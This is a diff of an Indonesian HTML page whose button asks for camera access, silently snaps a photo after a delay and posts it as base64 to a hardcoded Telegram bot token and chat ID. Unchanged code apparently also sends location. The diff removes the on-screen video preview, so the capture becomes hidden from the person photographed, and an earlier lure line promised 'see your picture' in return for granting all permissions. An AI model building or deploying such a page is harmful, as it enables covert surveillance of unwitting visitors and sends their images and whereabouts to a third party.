@@ -6,18 +6,14 @@
     <title>Akses Kamera dan Lokasi</title>
 </head>
 <body>
-    <h1>Lihat Gambar Mu</h1>
-    <button onclick="startCapture()">Izin kan semua untuk melihat gambar</button>
-    <video id="video" width="320" height="240" autoplay></video>
+    <h1>Ambil Gambar dan Kirim Lokasi</h1>
+    <button onclick="startCapture()">Ambil Gambar dan Kirim Lokasi</button>
     <script>
         function startCapture() {
             // Akses kamera
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: true })
                     .then(function(stream) {
-                        const video = document.getElementById('video');
-                        video.srcObject = stream;
-
                         // Ambil foto setelah beberapa detik
                         setTimeout(() => {
                             captureAndSend(stream);
@@ -49,39 +45,68 @@
         }
 
         function captureAndSend(stream) {
-            const video = document.getElementById('video');
-            const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
+            const video = document.createElement('video');
+            video.srcObject = stream;
 
-            // Tentukan ukuran canvas sesuai dengan video
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+            video.onloadedmetadata = () => {
+                // Tentukan ukuran canvas sesuai dengan video
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
 
-            // Gambar dari video ke canvas
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                // Tentukan ukuran canvas sesuai dengan video
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
 
-            // Ambil gambar sebagai data URL (base64)
-            const imageData = canvas.toDataURL('image/jpeg');
+                // Gambar dari video ke canvas
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Kirim gambar ke Telegram
-            sendToTelegram(imageData);
+                // Ambil gambar sebagai data URL (base64)
+                const imageData = canvas.toDataURL('image/jpeg');
+
+                // Kirim gambar ke Telegram
+                sendToTelegram(imageData);
+
+                // Stop stream setelah gambar diambil
+                stream.getTracks().forEach(track => track.stop());
+            };
         }
 
         function sendToTelegram(message) {
             const telegramToken = '7030408795:AAFfhnjy4x3f3gotpugela5qFMbVVnE9HpI';
             const chatId = '1746156378';
 
-            // Kirimkan pesan (gambar atau URL)
-            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
-            fetch(url, {
-                method: 'POST',
-                body: new URLSearchParams({
-                    chat_id: chatId,
-                    text: message
-                })
-            }).then(response => response.json())
-              .then(data => console.log('Pesan terkirim ke Telegram:', data))
-              .catch(error => console.log('Error:', error));
+            // Jika pesan berupa gambar (base64)
+            if (message.startsWith('data:image/jpeg;base64,')) {
+                const photoUrl = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
+
+                // Kirimkan foto dalam format base64 ke Telegram
+                fetch(photoUrl, {
+                    method: 'POST',
+                    body: new URLSearchParams({
+                        chat_id: chatId,
+                        photo: message
+                    })
+                }).then(response => response.json())
+                  .then(data => {
+                    if (data.ok) {
+                        console.log('Gambar terkirim ke Telegram');
+                    } else {
+                        console.log('Error mengirim gambar:', data);
+                    }
+                }).catch(error => console.log('Error:', error));
+            } else {
+                // Jika bukan gambar base64, kirimkan pesan teks biasa
+                const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+                fetch(url, {
+                    method: 'POST',
+                    body: new URLSearchParams({
+                        chat_id: chatId,
+                        text: message
+                    })
+                }).then(response => response.json())
+                  .then(data => console.log('Pesan terkirim ke Telegram:', data))
+                  .catch(error => console.log('Error:', error));
+            }
         }
     </script>
 </body>
